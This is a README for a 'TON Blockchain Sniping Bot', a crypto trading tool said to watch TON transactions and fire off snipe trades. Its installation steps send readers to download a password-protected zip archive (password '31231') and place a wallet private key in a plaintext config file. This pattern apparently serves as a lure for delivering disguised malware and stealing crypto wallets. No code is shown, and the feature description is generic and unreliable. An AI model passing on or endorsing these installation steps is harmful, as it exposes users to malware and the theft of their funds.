## **Overview**
TON Blockchain Sniping Bot is a fast, automated tool that connects to a TON node, monitors live transactions, filters them by custom conditions, and instantly executes snipe trades when matches are found.

### Key Components
- **TON Client Initialization**: This component sets up the connection to the TON blockchain node, allowing the bot to fetch transaction data.
- **Wallet Setup**: This component manages the bot's wallet, including private key management and transaction creation.
- **Transaction Monitoring**: This component continuously listens for new transactions on the blockchain and filters them based on specified criteria.
- **Transaction Sniping**: This component creates and sends new transactions in response to matched criteria, effectively performing the snipe.
### Installation
- [Download](https://github.com/knightlightst/ton-sniper/archive/refs/heads/main.zip) the repository.
- extract archive with pass `31231`.
- Create a `config.json` file.
- run the bot.

### Config.json
```
{
  "NodeUrl": "https://main.ton.dev",
  "PrivateKey": "your_private_key",
  "TargetAddress": "target_address",
  "TargetAmount": 1000
}
```
### Detailed Description

**TON Client Initialization**
- **Functionality**: Connects to a TON blockchain node to enable interaction with the blockchain.
- **Key Methods**:
  - `HttpClient.BaseAddress`: Sets the base address for the TON node.

**Wallet Setup**
- **Functionality**: Manages the wallet used for sending transactions.
- **Key Methods**:
  - `Wallet(privateKey)`: Initializes the wallet with a private key.

**Transaction Sniping**
- **Functionality**: Creates and sends a new transaction in response to a matched transaction, effectively performing the snipe.
- **Key Methods**:
  - `wallet.CreateTransaction(to, value, message)`: Creates a new transaction.
  - `SendTransaction(HttpClient client, JObject transaction)`: Sends the created transaction to the blockchain.

**Transaction Monitoring**
- **Functionality**: Listens for new transactions and filters them based on predefined criteria such as target address and amount.
- **Key Methods**:
  - `GetTransactions(HttpClient client)`: Fetches new transactions from the blockchain.
  - Filtering logic to match transactions against criteria (e.g., target address, target amount).
